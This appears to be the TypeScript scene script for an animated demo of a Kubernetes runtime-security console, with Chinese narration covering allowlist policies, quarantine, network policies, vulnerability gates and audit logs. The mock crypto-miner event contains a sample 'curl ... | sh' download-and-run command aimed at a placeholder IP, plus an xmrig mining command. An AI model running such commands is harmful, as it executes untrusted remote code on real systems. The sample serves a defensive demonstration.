import type { AuditRow, DemoState, Page, SecEvent } from "./store"
import { PAY_POD, PAY_POD_2 } from "./data"

export interface Api {
  fast: boolean
  update(patch: Partial<DemoState> | ((s: DemoState) => Partial<DemoState>)): void
  sleep(ms: number): Promise<void>
  moveTo(sel: string): Promise<void>
  click(sel: string): Promise<void>
  /** 聚光燈:圈住要操作的元素、旁邊說一句,停一下再繼續 */
  focus(sel: string, text: string, hold?: number): Promise<void>
  /** 打字到任意字串欄位 */
  type(set: (v: string) => Partial<DemoState>, text: string, speed?: number): Promise<void>
}

export type SceneRun = (a: Api) => Promise<void>

// 每次切頁都把會殘留的浮層收掉
const nav = (page: Page): Partial<DemoState> => ({ page, card: null, spot: null, modeOpen: false, confirmOpen: false, edgeOpen: false, terminal: 0, slack: false, exported: false })
const log = (row: AuditRow) => (s: DemoState) => ({ audit: [row, ...s.audit] })

// 點一下:先打聚光燈說明,再點,然後收掉聚光燈
async function press(a: Api, sel: string, text: string) {
  await a.focus(sel, text)
  await a.click(sel)
  a.update({ spot: null })
}

// 說明卡:停留 ms 毫秒後收起
async function card(a: Api, c: NonNullable<DemoState["card"]>, ms: number) {
  a.update({ card: c })
  await a.sleep(ms)
  a.update({ card: null })
  await a.sleep(400)
}

const XMRIG: SecEvent = {
  id: "xmrig", severity: "Critical", rule: "Process Rule", detail: "xmrig", ns: "shop", pod: PAY_POD, container: "payment-api",
  policy: "payment-api-allowlist", time: "just now", binary: "/tmp/.cache/xmrig -o pool.minexmr.example:4444",
  parent: "/bin/sh -c curl -s http://203.0.113.50/x | sh", user: "app (uid=1000)", fn: "__x64_sys_execve", hook: "kprobe", node: "w2", at: "2026/11/19 02:13:07",
}
// 被擋下之前,Monitoring 期間的一般事件
const WARNINGS: SecEvent[] = [
  { id: "w1", severity: "Warning", rule: "Process Rule", detail: "sh", ns: "shop", pod: "cart-5c8b4-q9wz", container: "cart", policy: "shop-baseline", time: "2h ago" },
  { id: "w2", severity: "Warning", rule: "Process Rule", detail: "curl", ns: "shop", pod: "storefront-7d9f8-k2lp", container: "storefront", policy: "shop-baseline", time: "5h ago" },
  { id: "w3", severity: "Warning", rule: "Process Rule", detail: "pg_dump", ns: "shop", pod: "orders-db-0", container: "postgres", policy: "shop-baseline", time: "9h ago" },
]

export function buildScenes(): SceneRun[] {
  return [
    /* 1 · 現況:只看情境圖 */
    async (a) => {
      a.update({ ...nav("dashboard") })
      await a.sleep(16000) // 等情境圖列完四個痛點與「在 Sentinel 裡這樣做」
    },

    /* 2 · 先觀察,學會正常行為:Behavior Discovery → 一鍵產生白名單 → 以 Monitoring 套用 */
    async (a) => {
      a.update({ ...nav("discovery"), policies: [{ name: "shop-baseline", scope: "namespaced", mode: "Monitoring", ns: "shop", by: "admin", created: "2026/11/02 10:12" }], peName: "", peRules: [] })
      await a.sleep(600)
      await card(a, "ebpf", 9000)
      await a.focus("disc-payment", "觀察 48 小時：payment-api 只跑過這兩支程式", 2600)
      a.update({ spot: null })
      await press(a, "disc-create", "一鍵產生政策")
      a.update({ page: "policy-new", peName: "payment-api-allowlist", peRules: ["/app/payment-server", "/bin/healthcheck"] })
      await a.sleep(500)
      await a.focus("pe-rules", "白名單：只允許學到的程式，其他一律算異常", 2600)
      await a.focus("pe-yaml", "YAML 自動產生，不用自己寫", 1800)
      await a.focus("pe-mode", "先用 Monitoring：只記錄、不攔截", 2000)
      a.update({ spot: null })
      await press(a, "pe-apply", "套用")
      a.update((s) => ({
        ...nav("policies"),
        policies: [{ name: "payment-api-allowlist", scope: "namespaced", mode: "Monitoring", ns: "shop", by: "admin", created: "2026/11/16 14:05" }, ...s.policies],
      }))
      a.update(log({ time: "2026/11/16 14:05", user: "admin", action: "Create tracing policy", target: "payment-api-allowlist", status: "Success" }))
      await a.sleep(500)
      await a.focus("pl-row-0", "政策上線了，目前只觀察、不影響服務", 2600)
      a.update({ spot: null })
    },

    /* 3 · 異常程式當下就擋:切到 Protect → 被植入 xmrig → kernel 終止、Slack 通知 */
    async (a) => {
      a.update({ ...nav("policies"), events: WARNINGS, expanded: null })
      await a.sleep(600)
      await press(a, "pl-mode-0", "白名單確認沒問題，改成 Protect")
      a.update({ modeOpen: true })
      await a.sleep(500)
      await press(a, "pl-mode-protect", "Protect：開始攔截")
      a.update((s) => ({ modeOpen: false, mode: "MIXED", policies: s.policies.map((p, i) => (i === 0 ? { ...p, mode: "Protect" } : p)) }))
      a.update(log({ time: "2026/11/18 09:30", user: "admin", action: "Switch policy mode", target: "payment-api-allowlist → Protect", status: "Success" }))
      await a.focus("pl-row-0", "數秒內生效，不用重啟任何服務", 2000)
      a.update({ spot: null })
      await card(a, "attack", 9500)
      a.update({ ...nav("events"), events: WARNINGS })
      await a.sleep(1200)
      a.update((s) => ({ events: [XMRIG, ...s.events] }))
      await a.sleep(600)
      await a.focus("ev-row-xmrig", "xmrig 一啟動，就在 kernel 裡被終止", 2600)
      a.update({ spot: null, slack: true })
      await a.sleep(600)
      await a.focus("slack", "值班人員同時收到 Slack 通知", 2600)
      a.update({ spot: null })
    },

    /* 4 · 先止血再調查:從事件一鍵隔離,網路切斷、證據保留 */
    async (a) => {
      a.update({ ...nav("events"), events: [XMRIG, ...WARNINGS], expanded: null, quarantined: false })
      await a.sleep(600)
      await card(a, "forensic", 8500)
      await press(a, "ev-row-xmrig", "打開這筆事件")
      a.update({ expanded: "xmrig" })
      await a.sleep(500)
      await a.focus("ev-detail", "誰執行、從哪裡啟動、在哪台主機，全都記下來", 2600)
      a.update({ spot: null })
      await press(a, "ev-quarantine", "Quarantine this pod")
      a.update({ confirmOpen: true })
      await a.sleep(500)
      await a.focus("dlg-q", "只切斷網路，容器繼續執行", 2200)
      a.update({ spot: null })
      await press(a, "dlg-q-ok", "隔離")
      a.update({ confirmOpen: false, quarantined: true })
      a.update(log({ time: "2026/11/19 02:16", user: "oncall", action: "Quarantine pod", target: `shop/${PAY_POD}`, status: "Success" }))
      await a.sleep(800)
      a.update({ ...nav("quarantine") })
      await a.sleep(600)
      await a.focus("q-row", "隔離中：資安人員可以進去蒐證，查完一鍵解除", 3000)
      a.update({ spot: null })
    },

    /* 5 · 管住每一條連線:拓撲上看見可疑連線 → 建 Network Policy 白名單 → 連線被丟棄 */
    async (a) => {
      a.update({ ...nav("topology"), quarantined: true, denied: false, npStep: 0, npName: "" })
      await a.sleep(900)
      await a.focus("topo-q", "剛剛隔離的 Pod：上鎖，所有連線都斷了", 2400)
      await a.focus("topo-sus", `另一個副本 ${PAY_POD_2.slice(-4)} 也在連外面的可疑主機`, 2800)
      a.update({ spot: null })
      a.update({ ...nav("netpol-new") })
      await a.sleep(500)
      await a.focus("np-name", "建立網路白名單", 500)
      await a.type((v) => ({ npName: v, npStep: 1 }), "payment-api-allow", 55)
      a.update({ spot: null, npStep: 2 })
      await a.sleep(400)
      await a.focus("np-applies", "管 app=payment-api，畫面直接顯示選到哪些 Pod", 2400)
      a.update({ npStep: 3 })
      await a.focus("np-ingress", "進來：只允許 storefront", 1900)
      a.update({ npStep: 4 })
      await a.focus("np-egress", "出去：只允許訂單資料庫 orders-db", 1900)
      a.update({ spot: null })
      await press(a, "np-apply", "套用")
      a.update(log({ time: "2026/11/19 02:31", user: "oncall", action: "Create network policy", target: "payment-api-allow", status: "Success" }))
      a.update({ ...nav("topology"), denied: true })
      await a.sleep(900)
      await a.focus("topo-sus", "白名單以外的連線，直接丟棄", 2200)
      await a.click("topo-sus")
      a.update({ spot: null, edgeOpen: true })
      await a.sleep(400)
      await a.focus("topo-detail", "點一下，就知道是哪一條政策擋下的", 2800)
      a.update({ spot: null })
    },

    /* 6 · 弱點:對外暴露的 Critical 排最前 → 設弱點門檻 → 新版映像檔被拒絕部署 */
    async (a) => {
      a.update({ ...nav("vulns"), vFilter: false, vapStep: 0, vapName: "" })
      await a.sleep(600)
      await card(a, "vuln", 9000)
      await a.focus("v-summary", "上千筆弱點，從哪裡開始修？", 2000)
      await a.focus("v-row-0", "對外暴露、又有 Critical 的，自動排第一", 2400)
      a.update({ spot: null })
      await press(a, "v-filter", "只看：對外暴露、有修補版本")
      a.update({ vFilter: true })
      await a.sleep(500)
      await a.focus("v-table", "這就是可以直接交給開發的待辦清單", 2400)
      a.update({ spot: null })
      a.update({ ...nav("vap-new") })
      await a.sleep(500)
      await a.focus("vap-name", "設一道部署門檻", 500)
      await a.type((v) => ({ vapName: v, vapStep: 1 }), "block-critical-images", 50)
      a.update({ spot: null, vapStep: 2 })
      await a.focus("vap-type", "規則類型：Vulnerability Limit", 1800)
      a.update({ vapStep: 3 })
      await a.focus("vap-critical", "Critical 弱點：一個都不允許", 2000)
      a.update({ vapStep: 4 })
      await a.focus("vap-binding", "套用到 shop，違規就拒絕（Deny）", 2000)
      a.update({ spot: null })
      await press(a, "vap-save", "Save")
      a.update(log({ time: "2026/11/19 10:05", user: "admin", action: "Create admission policy", target: "block-critical-images", status: "Success" }))
      await a.sleep(600)
      a.update({ terminal: 1 })
      await a.sleep(1800)
      a.update({ terminal: 2 })
      await a.sleep(500)
      await a.focus("term", "還有 Critical 弱點的新版本，部署時直接被拒絕", 3200)
      a.update({ spot: null })
    },

    /* 7 · 稽核:每一步都在 Audit Log,可匯出 */
    async (a) => {
      a.update({ ...nav("audit") })
      await a.sleep(700)
      await a.focus("audit-table", "剛剛每一個操作：誰、什麼時候、對誰、結果", 3000)
      a.update({ spot: null })
      await press(a, "audit-export", "匯出 CSV，交給稽核")
      a.update({ exported: true })
      await a.sleep(2400)
    },
  ]
}
